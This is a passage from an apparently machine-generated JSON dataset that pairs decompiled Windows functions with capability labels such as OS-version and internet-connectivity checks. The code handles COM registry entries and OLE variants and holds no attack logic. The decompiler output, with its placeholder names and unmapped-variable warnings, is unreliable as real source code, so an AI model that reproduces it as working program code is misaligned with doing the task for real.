puVar8[1] = *(unaff_EBP + -0x40);\n            puVar8[2] = *(unaff_EBP + -0x3c);\n            puVar8[3] = *(unaff_EBP + -0x38);\n            iVar16 = 0;\n            break;\n        case 0x10:\n        case 0x11:\n            **(unaff_EBP + 0x14) = *(unaff_EBP + -0x3c);\n        }\ncode_r0x0045c434:\n        *(unaff_EBP + -4) = 0;\n        fcn.0045bdda();\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x54) != iVar16) {\n            fcn.004115a4(*(unaff_EBP + -0x54));\n        }\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 4944
    },
    "0045c840": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0045c840(char **param_1, uint param_2, uint param_3, int32_t param_4, char *param_5)\n\n{\n    char *arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY300;\n    int32_t iStackY296;\n    char **ppcStackY292;\n    char *pcStackY288;\n    int32_t iStackY284;\n    char **ppcStackY280;\n    char *pcStackY276;\n    uchar *in_stack_ffffff00;\n    \n    fcn.004627af();\n    ppcStackY292 = param_1;\n    pcStackY288 = param_5;\n    fcn.0042407a();\n    fcn.0040f840();\n    fcn.0042407a();\n    pcStackY276 = 0x45c89f;\n    fcn.0040f840();\n    uStackY300 = 0;\n    if (param_5 == 0x80000000) {\n        pcStackY276 = &stack0xfffffed4;\n        ppcStackY280 = 0x20019;\n        iStackY284 = 0;\n        pcStackY288 = \"CLSID\";\n        ppcStackY292 = 0x80000000;\n        iStackY296 = 0x45c8c3;\n        (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA;\n    arg_ch = *param_1;\n    while (arg_ch != NULL) {\n        ppcStackY292 = ppcStackY292 + 1;\n        if ((pcStackY288 != 0x80000000) || (*arg_ch != '\\0')) {\n            ppcStackY280 = 0x45c8f9;\n            pcStackY276 = arg_ch;\n            iVar2 = (*pcVar1)();\n            ppcStackY280 = arg_ch + iVar2 + 1;\n            in_stack_ffffff00 = &stack0xfffffee4;\n            fcn.00431e30(in_stack_ffffff00, arg_ch, param_2, param_3);\n            pcStackY276 = 0x45c928;\n            fcn.00431e30(&stack0xfffffed8, ppcStackY280, param_2, param_3);\n            if ((pcStackY288 != 0x80000000) || (*(iStackY284 + -0xc) != 0)) {\n                if (param_4 == 0) {\n                    pcStackY276 = &stack0xfffffee8;\n                    ppcStackY280 = 0x100;\n                    ppcStackY292 = 0x45c958;\n                    iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueA)();\n                    if (iVar2 == 0) goto code_r0x0045c97c;\n                }\n                iVar2 = iStackY296;\n                pcStackY276 = iStackY296;\n                ppcStackY280 = 0x45c968;\n                ppcStackY292 = (*pcVar1)();\n                iStackY284 = iVar2;\n                pcStackY288 = 0x1;\n                iStackY296 = 1;\n                uStackY300 = 0x45c978;\n                ppcStackY280 = ppcStackY292;\n                iVar2 = (*_sym.imp.ADVAPI32.dll_RegSetValueA)();\n                if (iVar2 != 0) break;\n            }\n        }\ncode_r0x0045c97c:\n        arg_ch = *ppcStackY292;\n    }\n    pcStackY276 = 0x45c99c;\n    fcn.0043c894();\n    pcStackY276 = 0x45c9a7;\n    fcn.00402740();\n    pcStackY276 = 0x45c9b2;\n    fcn.00402740();\n    *in_FS_OFFSET = pcStackY276;\n    fcn.0045e747(in_stack_ffffff00);\n    return;\n}\n",
        "token_count": 910
    },
    "0045cc05": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.0045cc05(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h, uint arg_2ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627af(8);\n    iVar3 = *(unaff_EBP + 0x1c);\n    iVar2 = *(unaff_EBP + 0x18);\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 * 8 + 0x49c2ec);\n    }\n    iVar1 = *(unaff_EBP + 0x20);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0043026e();\n        if (*(iVar1 + 0x14) == '\\0') {\n            iVar1 = *(iVar2 * 8 + 0x49c2f0);\n        }\n        else {\n            iVar1 = *(iVar2 * 8 + 0x49c318);\n        }\n    }\n    fcn.0045c5de(10);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0045c9da(unaff_EBP + -0x14, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                         *(unaff_EBP + 0x14), *(unaff_EBP + 0x24), *(unaff_EBP + 0x28), *(unaff_EBP + 0x2c));\n    if (((iVar2 != 0) && (iVar3 = fcn.0045c840(iVar3, *(unaff_EBP + -0x14), 10, 0, 0x80000000),  iVar3 != 0)) &&\n       (iVar1 != 0)) {\n        fcn.0045c840(iVar1, *(unaff_EBP + -0x14), 10, 1, 0x80000000);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0045c619();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 586
    },
    "0045ccb8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid __cdecl\nfcn.0045ccb8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint var_14h;\n    uint var_4h;\n    \n    fcn.004627af(8);\n    iVar3 = *(unaff_EBP + 0x1c);\n    iVar2 = *(unaff_EBP + 0x18);\n    if (iVar3 == 0) {\n        iVar3 = *(iVar2 * 8 + 0x49c2ec);\n    }\n    iVar1 = *(unaff_EBP + 0x20);\n    if (iVar1 == 0) {\n        iVar1 = fcn.0043026e();\n        if (*(iVar1 + 0x14) == '\\0') {\n            iVar1 = *(iVar2 * 8 + 0x49c2f0);\n        }\n        else {\n            iVar1 = *(iVar2 * 8 + 0x49c318);\n        }\n    }\n    fcn.0045c5de(10);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0045c9da(unaff_EBP + -0x14, *(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), \n                         *(unaff_EBP + 0x14), 0, 0, 0);\n    if (((iVar2 != 0) && (iVar3 = fcn.0045c783(iVar3, *(unaff_EBP + -0x14), 10, 0x80000000),  iVar3 != 0)) &&\n       (iVar1 != 0)) {\n        fcn.0045c783(iVar1, *(unaff_EBP + -0x14), 10, 0x80000000);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0045c619();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 535
    },
    "0045cdd5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0045cdd5(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0x74) = param_2;\n    if (param_2 != 1) {\n        param_2 = ((param_2 != 2) - 1 & 3) - 1;\n    }\n    return param_2;\n}\n",
        "token_count": 90
    },
    "0045ce7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045ce7f(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t hWnd;\n    \n    iVar2 = *(param_1 + 0x68);\n    if (iVar2 != 0) {\n        iVar2 = *(iVar2 + 0x20);\n    }\n    hWnd = param_1;\n    uVar1 = fcn.0042603a(iVar2, &hWnd);\n    *(param_1 + 0x80) = uVar1;\n    fcn.0041a8cb(param_1);\n    iVar2 = sub.oledlg.dll_OleUIBusyA(param_1 + 0x78);\n    fcn.0041866d();\n    fcn.0041863f();\n    if (hWnd != 0) {\n        (*_sym.imp.USER32.dll_EnableWindow)(hWnd, 1);\n    }\n    uVar1 = 2;\n    if (iVar2 != 2) {\n        if (iVar2 == 0x75) {\n            *(param_1 + 0xa4) = 1;\n        }\n        else {\n            if (iVar2 != 0x76) {\n                if (iVar2 == 0x77) {\n                    *(param_1 + 0xa4) = 3;\n                    return 1;\n                }\n                uVar1 = fcn.0045cdd5(iVar2);\n            }\n            *(param_1 + 0xa4) = uVar1;\n        }\n        return 1;\n    }\n    return 2;\n}\n",
        "token_count": 351
    },
    "0045d0a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0045d0a4(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint extraout_ECX;\n    int32_t unaff_EBP;\n    ulong *arg_8h_00;\n    int16_t *piVar5;\n    uint pvargDest;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_4h;\n    \n    fcn.004627af(0x20);\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    var_4h = unaff_EBP + -0x2c;\n    *(unaff_EBP + -0x10) = 0;\n    fcn.00439e50(var_4h);\n    iVar2 = *(unaff_EBP + 8);\n    piVar5 = **(unaff_EBP + 0xc);\n    iVar1 = *(iVar2 + 0xc);\n    if ((iVar1 != 0xc) && (*piVar5 != iVar1)) {\n        iVar3 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(unaff_EBP + -0x2c, piVar5, 0, iVar1);\n        *(unaff_EBP + -0x10) = iVar3;\n        if (iVar3 < 0) {\n            **(unaff_EBP + 0x10) = 0;\n            goto code_r0x0045d1cd;\n        }\n        piVar5 = unaff_EBP + -0x2c;\n    }\n    arg_8h_00 = *(iVar2 + 0x18) + *(unaff_EBP + -0x14);\n    // switch table (20 cases) at 0x45d1d8\n    switch(*(iVar2 + 0xc)) {\n    case 2:\n    case 0x12:\n        *arg_8h_00 = piVar5[4];\n        break;\n    case 4:\n        *arg_8h_00 = *(piVar5 + 4);\n        break;\n    case 5:\n    case 7:\n        *arg_8h_00 = *(piVar5 + 4);\n        break;\n    case 6:\n    case 0x14:\n    case 0x15:\n        *arg_8h_00 = *(piVar5 + 4);\n        *(arg_8h_00 + 4) = *(piVar5 + 6);\n        break;\n    case 8:\n        fcn.00431aad(arg_8h_00, *(piVar5 + 4));\n        break;\n    case 9:\n    case 0xd:\n        if (*(piVar5 + 4) != 0) {\n            (**(**(piVar5 + 4) + 4))(*(piVar5 + 4));\n        }\n        fcn.00431b26(arg_8h_00);\n    case 3:\n    case 10:\n    case 0x13:\n        uVar4 = *(piVar5 + 4);\n        goto code_r0x0045d125;\n    case 0xb:\n        uVar4 = piVar5[4] != 0;\ncode_r0x0045d125:\n        *arg_8h_00 = uVar4;\n        break;\n    case 0xc:\n        iVar3 = (*_sym.imp.OLEAUT32.dll_VariantCopyInd)(arg_8h_00, piVar5);\n        if (iVar3 != 0) goto code_r0x0045d186;\n        break;\n    default:\n        *(unaff_EBP + -0x10) = 0x80020008;\ncode_r0x0045d186:\n        **(unaff_EBP + 0x10) = 0;\n        break;\n    case 0x10:\n    case 0x11:\n        *arg_8h_00 = *(piVar5 + 4);\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x2c);\n    if ((-1 < *(unaff_EBP + -0x10)) && (*(iVar2 + 0x14) != 0)) {\n        fcn.00430303(*(*(unaff_EBP + -0x14) + 0x1c));\n        *(unaff_EBP + -4) = 0;\n        (**(iVar2 + 0x14))();\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (*(unaff_EBP + -0x18) != 0) {\n            var_4h = 0;\n            fcn.0042f689();\n        }\n    }\ncode_r0x0045d1cd:\n    fcn.00462887(var_4h);\n    return;\n}\n",
        "token_count": 1157
    },
    "0045d386": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045d386(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    uint uStack28;\n    \n    iVar5 = 0;\n    if (0 < *(param_1 + 8)) {\n        do {\n            piVar2 = fcn.0045ba0c();\n            if ((*piVar2 == 0) || (iVar3 = fcn.0045ba0c(),  *(iVar3 + 4) == 0)) {\n                uStack28 = 0x4b62b8;\n                fcn.0046230a(&stack0xffffffe4, 0x4a76e8);\n                pcVar1 = swi(3);\n                (*pcVar1)();\n                return;\n            }\n            uStack28 = 0x45d3b5;\n            ppiVar4 = fcn.0045ba0c();\n            iVar3 = fcn.0045ba0c();\n            iVar5 = iVar5 + 1;\n            **(iVar3 + 4) = -(**ppiVar4 != 0);\n        } while (iVar5 < *(param_1 + 8));\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "0045d53b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_18h\n\nvoid __cdecl\nfcn.0045d53b(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int16_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int16_t iVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint extraout_ECX;\n    int32_t iVar10;\n    int16_t *piVar11;\n    int32_t unaff_EBP;\n    ulong *puVar12;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x18);\n    puVar9 = *(unaff_EBP + 8);\n    *puVar9 = extraout_ECX;\n    puVar12 = puVar9 + 1;\n    if ((*(unaff_EBP + 0x14) == 6) || (*(unaff_EBP + 0x14) == 0xc)) {\n        *puVar12 = *(unaff_EBP + 0x10);\n        puVar12 = puVar9 + 2;\n    }\n    puVar9 = *(unaff_EBP + 0x18);\n    uVar8 = *puVar9;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = uVar8;\n    *(unaff_EBP + 8) = puVar9[2];\n    *(unaff_EBP + -0x10) = puVar9[3];\n    cVar2 = **(unaff_EBP + 0xc);\n    *(unaff_EBP + 0x10) = *(unaff_EBP + 0xc);\n    if (cVar2 != '\\0') {\n        do {\n            uVar3 = **(unaff_EBP + 0x10);\n            uVar6 = uVar3;\n            iVar10 = *(unaff_EBP + 8) + -1;\n            *(unaff_EBP + 8) = iVar10;\n            *(unaff_EBP + 0x14) = uVar6;\n            if ((uVar3 != 0xff) && ((uVar3 & 0x40) != 0)) {\n                uVar6 = uVar6 & 0xffffffbf | 0x4000;\n                *(unaff_EBP + 0x14) = uVar6;\n            }\n            iVar5 = uVar6;\n            if (iVar10 < *(unaff_EBP + -0x10)) {\n                if (iVar5 == 0xff) {\n                    uVar8 = *(*(unaff_EBP + 0x18) + 0xc);\n                    *(unaff_EBP + -0x10) = 0;\n                    *(unaff_EBP + 8) = uVar8;\n                    *(unaff_EBP + -0x14) = 1;\n                    goto code_r0x0045d78b;\n                }\n                if ((*(unaff_EBP + -0x14) == 0) && (iVar5 == 0xc)) {\n                    *0x4bb6e8 = 10;\n                    *0x4bb6f0 = 0x80020004;\n                    piVar11 = 0x4bb6e8;\n                    goto code_r0x0045d6b5;\n                }\n                break;\n            }\n            if (iVar5 == 0xff) break;\n            piVar1 = iVar10 * 0x10 + *(unaff_EBP + -0x18);\n            piVar11 = piVar1;\n            if ((iVar5 != 0xc) && (iVar4 = *piVar1,  iVar5 != iVar4)) {\n                piVar11 = iVar10 * 0x10 + *(unaff_EBP + 0x20);\n                if (iVar5 == 0xe) {\n                    *(unaff_EBP + 0xc) = 8;\n                }\n                else {\n                    *(unaff_EBP + 0xc) = uVar6;\n                }\n                if (iVar4 != *(unaff_EBP + 0xc)) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(piVar11, piVar1, 0, *(unaff_EBP + 0xc));\n                    if (iVar10 < 0) goto code_r0x0045d7a8;\n                    uVar6 = *(unaff_EBP + 0x14);\n                }\n                if (uVar6 == 0xe) {\n                    if (*piVar1 == *(unaff_EBP + 0xc)) {\n                        uVar8 = fcn.00431761(*(piVar1 + 4));\n                        *(piVar11 + 4) = uVar8;\n                        *piVar11 = 8;\n                    }\n                    else {\n                        uVar8 = *(piVar11 + 4);\n                        uVar7 = fcn.00431761(uVar8);\n                        *(piVar11 + 4) = uVar7;\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar8);\n                    }\n                    *(unaff_EBP + 0x14) = 8;\n                    uVar6 = *(unaff_EBP + 0x14);\n                }\n            }\ncode_r0x0045d6b5:\n            if ((uVar6 & 0x4000) != 0) {\n                if ((uVar6 == 0x400b) && (iVar10 = *(unaff_EBP + 0x24),  iVar10 != 0)) {\n                    *(unaff_EBP + 0x14) = **(piVar11 + 4) != 0;\n                    puVar9 = fcn.00411579(4);\n                    if (puVar9 == NULL) {\n                        *(unaff_EBP + 0x14) = 0;\n                    }\n                    else {\n                        *puVar9 = *(unaff_EBP + 0x14);\n                        *(unaff_EBP + 0x14) = puVar9;\n                    }\n                    uVar7 = fcn.0045ba32(*(unaff_EBP + 0x14), *(piVar11 + 4), 1);\n                    uVar8 = *(iVar10 + 8);\n                    *(unaff_EBP + -4) = 0;\n                    fcn.0045be80(uVar8, uVar7);\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x1c) != 0) {\n                        fcn.004115a4(*(unaff_EBP + -0x24));\n                    }\n                    piVar11 = *(unaff_EBP + 0x14);\n                }\n                else {\n                    piVar11 = *(piVar11 + 4);\n                }\ncode_r0x0045d72d:\n                *puVar12 = piVar11;\n                goto code_r0x0045d789;\n            }\n    // switch table (20 cases) at 0x45d7d3\n            switch(uVar6 & 0xffff) {\n            case 2:\n                uVar6 = piVar11[4];\n                break;\n            case 3:\n            case 8:\n            case 9:\n            case 10:\n            case 0xd:\n            case 0x13:\n                uVar6 = *(piVar11 + 4);\n                break;\n            case 4:\n                *puVar12 = *(piVar11 + 4);\n                goto code_r0x0045d789;\n            case 5:\n            case 7:\n                *puVar12 = *(piVar11 + 4);\n                goto code_r0x0045d766;\n            case 6:\n            case 0x14:\n            case 0x15:\n                *puVar12 = *(piVar11 + 4);\n                *(puVar12 + 4) = *(piVar11 + 6);\ncode_r0x0045d766:\n                puVar12 = puVar12 + 1;\n                goto code_r0x0045d78b;\n            case 0xb:\n                uVar6 = piVar11[4] != 0;\n                break;\n            case 0xc:\n                goto code_r0x0045d72d;\n            default:\n                goto code_r0x0045d78b;\n            case 0x10:\n                uVar6 = *(piVar11 + 4);\n                break;\n            case 0x11:\n                uVar6 = *(piVar11 + 4);\n                break;\n            case 0x12:\n                uVar6 = piVar11[4];\n            }\n            *puVar12 = uVar6;\ncode_r0x0045d789:\n            puVar12 = puVar12 + 4;\ncode_r0x0045d78b:\n            *(unaff_EBP + 0x10) = *(unaff_EBP + 0x10) + 1;\n        } while (**(unaff_EBP + 0x10) != '\\0');\n        puVar9 = *(unaff_EBP + 0x18);\n    }\n    if (*(unaff_EBP + 8) < 1) {\n        if (**(unaff_EBP + 0x10) != '\\0') {\n            **(unaff_EBP + 0x1c) = puVar9[2];\n        }\n    }\n    else {\ncode_r0x0045d7a8:\n        **(unaff_EBP + 0x1c) = *(unaff_EBP + 8);\n    }\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 2266
    },
    "0045d823": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_1dh\n// WARNING: Variable defined which should be unmapped: var_34h_2\n// WARNING: Variable defined which should be unmapped: var_30h_3\n// WARNING: Variable defined which should be unmapped: var_2ch_3\n// WARNING: Variable defined which should be unmapped: var_30h_2\n// WARNING: Variable defined which should be unmapped: var_2ch_2\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: pvargDest\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n\nvoid __cdecl\nfcn.0045d823(uint noname_0, uint arg_14h_2, uint arg_18h, uint arg_8h, uint arg_ch, uint noname_5, uint arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    char cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t extraout_ECX;\n    int32_t *piVar8;\n    int32_t unaff_EBP;\n    float10 fVar9;\n    ulong uVar10;\n    uint var_4h;\n    uint var_6ch_2;\n    uint var_6ch;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_34h_2;\n    uint var_30h_3;\n    uint var_2ch_3;\n    uint var_30h_2;\n    uint var_2ch_2;\n    uint var_34h;\n    uint pvargDest;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    int32_t lpString;\n    uint uStack12;\n    uint var_10h;\n    uint uStack4;\n    \n    uStack4 = 0x50;\n    var_10h = 0x45d82f;\n    fcn.0046284e();\n    *(unaff_EBP + -0x34) = extraout_ECX;\n    var_10h = *(extraout_ECX + 0x1c);\n    uStack12 = 0x45d83d;\n    fcn.00430303();\n    iVar6 = *(unaff_EBP + 8);\n    iVar5 = *(iVar6 + 8);\n    *(unaff_EBP + -4) = 0;\n    *(unaff_EBP + -0x1d) = 0;\n    *(unaff_EBP + -0x18) = iVar5;\n    if (iVar5 == 0) {\n        *(unaff_EBP + -0x18) = unaff_EBP + -0x1d;\n    }\n    uStack12 = *(unaff_EBP + -0x18);\n    lpString = 0x45d862;\n    iVar5 = (*_sym.imp.KERNEL32.dll_lstrlenA)();\n    *(unaff_EBP + -0x28) = *(iVar6 + 0x10);\n    *(unaff_EBP + -0x24) = *(iVar6 + 0xc);\n    if ((*(unaff_EBP + 0xc) & 0xc) == 0) {\ncode_r0x0045d8e9:\n        iVar6 = *(unaff_EBP + 0x14);\n        lpString = *(iVar6 + 8) << 4;\n        stack0xffffffec = 0x45d8f8;\n        cVar3 = fcn.00401120();\n        if ((cVar3 != '\\0') && (uVar7 = *(iVar6 + 8),  uVar7 < 0x8000000)) {\n            lpString = 0x45d921;\n            fcn.00462d70();\n            *(unaff_EBP + -0x10) = &stack0xfffffff4;\n            *(unaff_EBP + -0x1c) = &stack0xfffffff4;\n            stack0xffffffec = 0;\n            lpString = uVar7 << 4;\n            fcn.00462290(*(unaff_EBP + -0x1c));\n            lpString = *(unaff_EBP + -0x24);\n            unique0x00007a00 = *(unaff_EBP + -0x18);\n            iVar6 = fcn.0045cf98();\n            cVar3 = fcn.00401120(iVar6 + 0x10);\n            if (cVar3 != '\\0') {\n                fcn.00462d70();\n                *(unaff_EBP + -0x10) = &fcn.0045d823::var_1dh + 1;\n                piVar8 = NULL;\n                *(unaff_EBP + -0x58) = vtable.CArray_class_CVariantBoolPair__class_CVariantBoolPair_const__.0;\n                *(unaff_EBP + -0x54) = 0;\n                *(unaff_EBP + -0x48) = 0;\n                *(unaff_EBP + -0x4c) = 0;\n                *(unaff_EBP + -0x50) = 0;\n                *(unaff_EBP + -4) = 1;\n                iVar5 = fcn.0045d53b(&fcn.0045d823::var_1dh + 1, *(unaff_EBP + -0x18), unaff_EBP + -0x44, \n                                     *(unaff_EBP + -0x24), *(unaff_EBP + 0x14), *(unaff_EBP + 0x18), \n                                     *(unaff_EBP + -0x1c), unaff_EBP + -0x58);\n                *(unaff_EBP + -0x18) = iVar5;\n                if (iVar5 == 0) {\n                    uVar7 = *(unaff_EBP + -0x24);\n                    uVar1 = *(unaff_EBP + -0x28);\n                    *(unaff_EBP + -4) = 2;\n                    if (uVar7 == 4) {\n                        fVar9 = fcn.0045e736(uVar1, &fcn.0045d823::var_1dh + 1, iVar6);\n                        *(unaff_EBP + -0x34) = fVar9;\n                        *(unaff_EBP + -0x44) = *(unaff_EBP + -0x34);\n                    }\n                    else if ((uVar7 == 5) || (uVar7 == 7)) {\n                        fVar9 = fcn.0045e736(uVar1, &fcn.0045d823::var_1dh + 1, iVar6);\n                        *(unaff_EBP + -0x44) = fVar9;\n                    }\n                    else if (uVar7 - 0x14 < 2) {\n                        uVar10 = fcn.0045e736(uVar1, &fcn.0045d823::var_1dh + 1, iVar6);\n                        *(unaff_EBP + -0x44) = uVar10;\n                        *(unaff_EBP + -0x40) = uVar10 >> 0x20;\n                    }\n                    else {\n                        piVar8 = fcn.0045e736(uVar1, &fcn.0045d823::var_1dh + 1, iVar6);\n                    }\n                    *(unaff_EBP + -4) = 1;\n                }\n                iVar6 = *(unaff_EBP + 0x14);\n                uVar7 = 0;\n                if (*(iVar6 + 8) != 0) {\n                    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c);\n                    do {\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(*(unaff_EBP + -0x1c));\n                        *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 0x10;\n                        uVar7 = uVar7 + 1;\n                    } while (uVar7 < *(iVar6 + 8));\n                }\n                if (*(unaff_EBP + -0x18) != 0) {\n                    *(unaff_EBP + -4) = 0;\n                    fcn.0045bdda();\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    if (*(unaff_EBP + -0x2c) != 0) {\n                        fcn.0042f689(0, *(unaff_EBP + -0x30));\n                    }\n                    goto code_r0x0045db26;\n                }\n                fcn.0045d386();\n                puVar2 = *(unaff_EBP + 0x10);\n                if (puVar2 == NULL) {\n                    iVar4 = *(unaff_EBP + -0x24);\n                    if (iVar4 == 8) {\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(piVar8);\n                    }\n                    else if (iVar4 == 9) {\ncode_r0x0045dae5:\n                        if (piVar8 != NULL) {\n                            (**(*piVar8 + 8))(piVar8);\n                        }\n                    }\n                    else if (iVar4 == 0xc) {\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x44);\n                    }\n                    else if (iVar4 == 0xd) goto code_r0x0045dae5;\n                }\n                else {\n                    uVar7 = *(unaff_EBP + -0x24);\n                    *puVar2 = uVar7;\n    // switch table (20 cases) at 0x45db33\n                    switch(uVar7 & 0xffff) {\n                    case 3:\n                    case 8:\n                    case 9:\n                    case 10:\n                    case 0xd:\n                    case 0x13:\n                        puVar2[2] = piVar8;\n                        break;\n                    case 4:\n                        puVar2[2] = *(unaff_EBP + -0x44);\n                        break;\n                    case 5:\n                    case 7:\n                        *(puVar2 + 2) = *(unaff_EBP + -0x44);\n                        break;\n                    case 6:\n                    case 0x14:\n                    case 0x15:\n                        puVar2[2] = *(unaff_EBP + -0x44);\n                        puVar2[3] = *(unaff_EBP + -0x40);\n                        break;\n                    case 0xb:\n                        piVar8 = -(piVar8 != 0);\n                    case 2:\n                    case 0x12:\n                        *(puVar2 + 2) = piVar8;\n                        break;\n                    case 0xc:\n                        *puVar2 = *(unaff_EBP + -0x44);\n                        puVar2[1] = 